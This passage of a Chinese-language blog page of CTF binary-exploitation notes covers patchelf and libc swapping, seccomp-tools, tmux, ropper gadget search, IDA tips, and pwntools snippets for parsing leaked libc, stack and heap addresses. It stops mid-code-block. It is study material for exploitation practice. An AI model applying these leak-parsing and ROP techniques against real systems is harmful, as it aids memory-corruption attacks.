</span></span><span class=line><span class=cl>        /lib64/ld-linux-x86-64.so.2 <span class=o>(</span>0x00007fb203a46000<span class=o>)</span></span></span></code></pre></div></div><p>改变程序的链接库路径，使用工具修改 libc 文件</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1>#生成符号连接以使gdb能够调试，若未设置跳转到pwndbg调试解决问题</span>
</span></span><span class=line><span class=cl>sudo ln ld-x.xx.so /lib64/ld-x.xx.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># libc 和 ld 都需要有可执行权限 chmod 777 xxx, new_libc.so使用相对路径加./ 执行失败可能架构未匹配</span>
</span></span><span class=line><span class=cl>patchelf --set-interpreter ld-x.xx.so elf <span class=c1># 来修改文件ld.so</span>
</span></span><span class=line><span class=cl>patchelf --replace-needed libc.so.6 ./new_libc.so elf  <span class=c1># 来修改文件libc.so</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 利用 glibc-all-in-one 成功执行</span>
</span></span><span class=line><span class=cl>patchelf --set-interpreter ./glibc-all-in-one/libs/ubuntu/ld.so --set-rpath ./glibc-all-in-one/libs/ubuntu elf</span></span></code></pre></div></div><p>或者</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s1>&#39;~/name/x.xx-3ubuntu1_amd64/ld-x.xx.so&#39;</span><span class=p>,</span> <span class=s1>&#39;./elf&#39;</span><span class=p>],</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span><span class=s1>&#39;~/name/x.xx-3ubuntu1_amd64/libc.so.6&#39;</span><span class=p>})</span></span></span></code></pre></div></div><p>更改为</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldd ./elf
</span></span><span class=line><span class=cl>	linux-vdso.so.1 <span class=o>(</span>0x00007fff2be66000<span class=o>)</span>
</span></span><span class=line><span class=cl>	./libc-2.23.so <span class=o>(</span>0x00007f81a8b3b000<span class=o>)</span>
</span></span><span class=line><span class=cl>	./ld-2.23.so <span class=o>=</span>&gt; /lib64/ld-linux-x86-64.so.2 <span class=o>(</span>0x00007f81a8ee5000<span class=o>)</span></span></span></code></pre></div></div><p><strong>注意：在单个 libc 版本中还有多个版本，需要多次在本地尝试</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>show debug-file-directory <span class=c1># usr/lib/debug, 其中包含.build-id</span></span></span></code></pre></div></div><p>需要在 gdb 中设置</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=nb>set</span> debug-file-directory debug/</span></span></code></pre></div></div><p>尽量下载最新版本 ubuntu 或 kali 机，若只有低版本 libc2.31 在后续调试<strong>堆</strong>时使用 glibc-all-in-one 可能使用不了 gdb</p><h3 id=seccomp-tools>seccomp-tools</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>sudo seccomp-tools dump ./xxx <span class=c1>#查看是否存在沙箱保护，只能执行允许的系统调用函数</span></span></span></code></pre></div></div><h3 id=tmux>tmux</h3><img src=/img/pwn_note.zh-cn.assets/17284427308283.png><p><strong>命令行</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>tmux ls <span class=c1># 查看session</span>
</span></span><span class=line><span class=cl>tmux new -t name <span class=c1># 创建新的session, name</span></span></span></code></pre></div></div><p><strong>tmux 指令</strong></p><p>prefix 默认为<code>ctrl + b</code>，<code>gdb.attach</code>先要打开 tmux</p><ul><li><code>ctrl + B + d</code> 可从 tmux 中退出且保留 tmux，重新进入输入<code>tmux a-t name/number</code></li><li><code>ctrl + B + t</code> 显示时间</li></ul><p>配置</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Tmux启用鼠标 + 可使用滚轮滑动</span>
</span></span><span class=line><span class=cl>touch ~/.tmux.conf
</span></span><span class=line><span class=cl><span class=nb>set</span> -g mouse on <span class=c1># 启动鼠标 shift选中内容, ctrl+insert复制, shift+insert粘贴</span>
</span></span><span class=line><span class=cl><span class=c1># 右键快捷栏 可拖动</span>
</span></span><span class=line><span class=cl>tmux source-file ~/.tmux.conf</span></span></code></pre></div></div><p>复制：</p><ol><li><code>ctrl + b + [</code>进入复制模式，移到目标位置</li><li><code>ctrl + 空格键</code>开始复制，方向键移动选择复制区域</li><li><code>alt + w</code>复制选中文本并退出复制模式</li><li>按下<code>ctrl + b + ]</code>粘贴文本</li></ol><p>Pane 指令：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ctrl + b + <span class=s2>&#34; #下方新建 改为-
</span></span></span><span class=line><span class=cl><span class=s2>ctrl + b + % #右方新建 改为|
</span></span></span><span class=line><span class=cl><span class=s2>ctrl + b + x #关闭
</span></span></span><span class=line><span class=cl><span class=s2>ctrl + b + [space] # 调整布局
</span></span></span><span class=line><span class=cl><span class=s2>ctrl + b + z # 面板缩放, 最大最小化
</span></span></span><span class=line><span class=cl><span class=s2>ctrl + B + 上下左右键 # 转换屏幕
</span></span></span><span class=line><span class=cl><span class=s2>ctrl + B + [ # 可实现上下翻页
</span></span></span><span class=line><span class=cl><span class=s2>Ctrl + b + o #光标切换到下一个窗格</span></span></span></code></pre></div></div><p>Window 指令：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ctrl + b + c <span class=c1># 新建窗口</span>
</span></span><span class=line><span class=cl>ctrl + b + <span class=p>&amp;</span> <span class=c1># 关闭</span>
</span></span><span class=line><span class=cl>Ctrl + b + 0~9 <span class=c1># 切换到指定索引窗口</span>
</span></span><span class=line><span class=cl>Ctrl + b + p <span class=c1># 切换到上一个窗口</span>
</span></span><span class=line><span class=cl>Ctrl + b + n <span class=c1># 切换到下一个窗口</span>
</span></span><span class=line><span class=cl>ctrl + b + w <span class=c1># 列出windows</span>
</span></span><span class=line><span class=cl>ctrl + b + , <span class=c1># 重命名</span></span></span></code></pre></div></div><p><strong>分屏复用</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tmux list-sessions    <span class=c1>#查看sessions</span>
</span></span><span class=line><span class=cl>tmux list-windows     <span class=c1>#查看windows</span>
</span></span><span class=line><span class=cl>tmux list-panes       <span class=c1>#查看panes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tmux send-keys -t &lt;sessions&gt;:&lt;windows&gt;.&lt;panes&gt; <span class=s2>&#34;content&#34;</span> Enter</span></span></code></pre></div></div><h3 id=ropper>ropper</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1>#寻找gadget</span>
</span></span><span class=line><span class=cl>ropper --file <span class=o>[</span>file_name<span class=o>]</span> --nocolor --search <span class=s2>&#34;汇编指令&#34;</span></span></span></code></pre></div></div><h3 id=ida>IDA</h3><p><strong>注</strong>：</p><p>一般直接进入<code>Exports</code>中找<code>start</code></p><p>IDA 虚拟地址的偏移很可能不可靠</p><p>显示机器码：<code>Options > General > Number of opcode bytes > 10</code></p><p>字符串不连接在一起，使用<code>Edit</code> > <code>Export data</code> 选择如何导出</p><p>粉色函数表明：外部函数，生成在<code>extern</code>段中</p><p><strong>单键</strong></p><ul><li>对变量按<code>n</code>重命名，<code>/</code>添加注释</li><li>对函数按键<code>x</code>可以看到索引-交叉引用（何处被调用）</li><li>按<code>y</code>可以看到函数及变量声明，可以<strong>修改参数、数据类型</strong>，<code>u</code>可以<code>undefine</code>函数，<code>p</code>将代码分析为函数</li><li><code>r</code>可以将数字转为字符，<code>h</code>还原为数字，<code>u</code>还原为原数据</li><li><code>g</code>输入地址可直接跳转，<code>c</code>让某一个位置变为指令</li><li><code>tab</code>键切换汇编和反编译图</li></ul><p><strong>右键</strong></p><ul><li><strong>将数字转化为十六进制、十进制、八进制、字符类型显示</strong></li><li><code>> Collapse declarations</code>：折叠一长串变量</li><li><code>> Keypatch > Patcher</code>：修改汇编代码</li><li><code>> Mark as decompiled</code>：标记已经反编译完的</li><li><code>> Copy to assembly</code>：汇编与 c 语言代码对照显示</li></ul><p><strong>组合键</strong></p><ul><li><p><code>shift + F12</code>：Strings window</p></li><li><p><code>ctrl + s</code>：段信息</p></li></ul><p><strong>补充符号表</strong>：制作签名文件</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo cp /lib/x86_64-linux-gnu/libc.a . <span class=c1># 放入Flair工具文件夹中</span>
</span></span><span class=line><span class=cl>./pelf libc.a libc-2.XX.pat <span class=c1># 生成libc-2.XX.exc中删除注释自动处理冲突</span>
</span></span><span class=line><span class=cl>./sigmake ./libc-2.XX.pat libc-2.XX.sig <span class=c1># 放入IDA sig目录 pc下</span>
</span></span><span class=line><span class=cl><span class=c1># IDA: View &gt; Open subviews &gt; Signatures &gt; 右键 &gt; Apply new signature...</span></span></span></code></pre></div></div><p><strong>结构体</strong>直接创建分析：</p><ul><li><code>View</code> > <code>Open subviews</code> > <code>Local types</code></li><li><code>右键</code> > <code>Insert</code> or <code>ins键</code></li><li>写入新的结构体，不断更新，F5 重新反编译<ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>somestruct</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>type</span> <span class=n>xxx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>_DWORD</span> <span class=n>unknown_0</span><span class=p>;</span>  <span class=c1>//4字节
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>      <span class=c1>//0x40
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>void</span><span class=o>*</span> <span class=n>ptr</span><span class=p>;</span>         <span class=c1>//指针先用void*，之后可将void更改为对应的数据类型
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span></span></span></code></pre></div></div></li></ul></li><li>同样可以使用<code>typedef</code>将长的类型取别名</li></ul><p><strong>IDA 例子解析</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.rodata:08048668 data db <span class=s1>&#39;a&#39;</span>,0
</span></span><span class=line><span class=cl>.rodata:08048668   <span class=p>;</span> DATA XREF: main+49↑o
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#rodata只读数据节    DATA XREF表示该字符串在main的多少偏移中引用</span></span></span></code></pre></div></div><p>F5 伪代码</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=n>a1</span><span class=err>@</span><span class=o>&lt;</span><span class=n>rbp</span><span class=o>&gt;</span> <span class=c1>// a1 通过 rbp 寄存器传递
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>//用于将输入输出缓冲区关闭，直接输出到屏幕输入到相应位置
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>setbuf</span><span class=p>(</span><span class=n>bss_start</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// 禁用 bss_start 文件流处的缓冲区, 每次读写立即系统调用
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>LODWORD</span><span class=p>(</span><span class=n>x</span><span class=p>);</span> <span class=c1>// 从x中提取低位dword
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>HIDWORD</span><span class=p>(</span><span class=n>x</span><span class=p>);</span> <span class=c1>// 从x中提取高位dword
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=mh>0x4002c7</span><span class=p>)(</span><span class=n>var</span><span class=p>);</span> <span class=c1>// 地址形式调用函数 =func(var)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>*</span><span class=p>((</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>o</span> <span class=o>+</span> <span class=mi>3</span><span class=p>)</span> <span class=o>=</span> <span class=n>a</span><span class=p>;</span> <span class=c1>// 表示将a函数地址放在o指针向后偏移 3 * 8 bytes的位置
</span></span></span></code></pre></div></div><p><strong>IDA 反汇编函数转栈帧：</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// 变量多尽量使用esp的相对偏移来分析栈帧
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>**</span><span class=n>v3</span><span class=p>;</span> 	<span class=c1>// ST04_4
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> 	<span class=c1>// ST08_4
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span> <span class=n>src</span><span class=p>;</span> 	<span class=c1>// [esp+12h] [ebp-10Eh]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span> <span class=n>buf</span><span class=p>;</span> 	<span class=c1>// [esp+112h] [ebp-Eh]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>_DWORD</span> <span class=o>*</span><span class=n>v8</span><span class=p>;</span> <span class=c1>// [esp+11Ch] [ebp-4h]
</span></span></span></code></pre></div></div><p><strong>栈帧结构</strong>：调用函数 foo，则对栈帧进行改变</p><img src=/img/pwn_note.zh-cn.assets/image-20241028170727577.png alt=图片无法加载><h3 id=pwntools>pwntools</h3><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;i386&#39;</span><span class=p>,</span> <span class=n>os</span> <span class=o>=</span> <span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;sp&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># log_level=&#39;fatal&#39; 完全不输出</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;split-w&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span> <span class=c1># 需要保证tmux已经运行</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./xxx&#34;</span><span class=p>)</span> <span class=c1># pid xxxx</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;./xxx&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;ip&#34;</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=s2>&#34;b main&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=s2>&#34;b *$rebase(0x偏移地址)</span><span class=se>\n</span><span class=s2>c&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=s2>&#34;c&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=n>a</span><span class=p>:</span><span class=n>b</span><span class=p>]</span> <span class=c1># 可以使用切片获取返回值</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;xxx</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># 直到接受到\n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;abc</span><span class=se>\x0a</span><span class=s2>&#34;</span><span class=p>)</span> <span class=c1># 输入必须为字节流, 前一个sendline可能影响后一个send</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=c1># 自动加一个\n换行</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;xxx</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=c1># 在送入不包含\n时还需要人工输入\n才会getshell</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;xx&#34;</span><span class=p>,</span> <span class=n>input_something</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#取返回值（地址）的方法，输入以 &#34;a&#34;结尾</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;0x&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>address</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 直接接受0xabc, False不接收\n</span>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=kc>False</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#64位中获取地址</span>
</span></span><span class=line><span class=cl><span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=c1># 自使用获取栈地址stack addr 0x10需自调整</span>
</span></span><span class=line><span class=cl><span class=n>addr</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ebp_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=s2>&#34;0x&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>addr</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>hex</span><span class=p>()),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7f</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>((</span><span class=s1>&#39;</span><span class=se>\x55</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x56</span><span class=s1>&#39;</span><span class=p>))[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>&amp;~</span><span class=mh>0xFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 32位</span>
</span></span><span class=line><span class=cl><span class=n>u32</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\xf7</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>4</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 64位</span>
